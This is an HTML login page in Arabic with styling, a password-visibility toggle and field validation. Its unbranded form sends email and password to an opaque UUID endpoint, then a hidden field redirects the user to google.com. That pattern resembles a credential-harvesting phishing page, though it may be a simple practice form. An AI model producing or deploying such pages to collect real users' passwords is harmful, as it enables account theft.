<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة الدخول المحسنة</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    
    <style>
        /* التنسيقات الجمالية (CSS) */
        body {
            font-family: 'Cairo', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            /* خلفية متدرجة خفيفة */
            background: linear-gradient(135deg, #e0f7fa 0%, #b3e5fc 100%);
            direction: rtl;
        }
        .box {
            background-color: white;
            padding: 40px;
            border-radius: 15px;
            /* ظل لطيف للصندوق */
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            width: 350px;
            max-width: 90%;
            transition: transform 0.3s ease;
        }
        .box:hover {
            transform: translateY(-5px);
        }
        h2 {
            text-align: center;
            color: #0d47a1;
            margin-bottom: 30px;
            font-weight: 700;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            color: #333;
        }
        /* تنسيق الأزرار وحقول الإدخال */
        .input-group {
            position: relative; /* لتثبيت أيقونة العين داخله */
            margin-bottom: 20px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 14px;
            /* زيادة المسافة الداخلية اليسرى لأجل أيقونة العين */
            padding-left: 45px; 
            border: 2px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        input[type="email"]:focus, input[type="password"]:focus {
            border-color: #1877f2;
            box-shadow: 0 0 8px rgba(24, 119, 242, 0.4);
            outline: none;
        }
        
        /* تنسيق أيقونة إظهار كلمة المرور */
        .toggle-password {
            position: absolute;
            top: 50%;
            left: 10px; /* وضعها في الزاوية اليسرى */
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 20px;
            color: #666;
            transition: color 0.2s;
            line-height: 1;
        }
        .toggle-password:hover {
            color: #1877f2;
        }

        /* تنسيق زر الإرسال */
        button {
            background-color: #1877f2;
            color: white;
            padding: 15px 0;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 18px;
            font-weight: 700;
            transition: background-color 0.3s ease, box-shadow 0.3s;
            margin-top: 10px;
        }
        button:hover {
            background-color: #166fe5;
            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
        }
        .error-message {
            color: #e53935;
            font-size: 14px;
            margin-top: -15px;
            margin-bottom: 15px;
            display: none;
        }
    </style>
</head>
<body>

<div class="box">
    <h2>ادخل بياناتك</h2>   

    <form id="loginForm" action="b2ed5633-7b5f-46c3-b087-5bb11a7da5a0">
        
        <label for="emailInput">البريد الإلكتروني:</label>
        <div class="input-group">
            <input type="email" id="emailInput" name="البريد" placeholder="أدخل البريد" required>
        </div>
        <div class="error-message" id="emailError">الرجاء إدخال البريد الإلكتروني.</div>
        
        <label for="passwordInput">كلمة المرور:</label>
        <div class="input-group">
            <input type="password" id="passwordInput" name="كلمة_المرور" placeholder="أدخل كلمة المرور" required>
            <span class="toggle-password" id="togglePassword">👁️</span>
        </div>
        <div class="error-message" id="passwordError">الرجاء إدخال كلمة المرور.</div>
        
        <button type="submit">إرسال</button>
        
        <input type="hidden" name="_redirect" value="https://www.google.com/">
    </form>
</div>

<script>
    // التفاعلية والتحقق من الحقول (JavaScript)

    const form = document.getElementById('loginForm');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const emailError = document.getElementById('emailError');
    const passwordError = document.getElementById('passwordError');
    const togglePassword = document.getElementById('togglePassword');

    // 1. وظيفة التحقق من النموذج
    form.addEventListener('submit', function(event) {
        let isValid = true;

        if (emailInput.value.trim() === '') {
            emailError.style.display = 'block';
            isValid = false;
        } else {
            emailError.style.display = 'none';
        }

        if (passwordInput.value.trim() === '') {
            passwordError.style.display = 'block';
            isValid = false;
        } else {
            passwordError.style.display = 'none';
        }

        if (!isValid) {
            event.preventDefault(); // منع الإرسال إذا كان هناك خطأ
        }
    });

    // 2. إخفاء رسالة الخطأ عند بدء الكتابة
    emailInput.addEventListener('input', function() {
        emailError.style.display = 'none';
    });

    passwordInput.addEventListener('input', function() {
        passwordError.style.display = 'none';
    });

    // 3. وظيفة إظهار/إخفاء كلمة المرور
    togglePassword.addEventListener('click', function() {
        // التحقق من النوع الحالي
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        
        // تبديل نوع الحقل
        passwordInput.setAttribute('type', type);

        // تغيير الأيقونة بناءً على الحالة: 
        // 👁️ للرؤية (مخفية الآن) و 🙈 للرؤية المحجوبة (ظاهرة الآن)
        if (type === 'text') {
            this.textContent = '🙈'; // عين مغمضة (للدلالة على أن الكلمة ظاهرة ويجب إخفاؤها)
        } else {
            this.textContent = '👁️'; // عين مفتوحة (للدلالة على أن الكلمة مخفية ويمكن إظهارها)
        }
    });
</script>

</body>
</html>
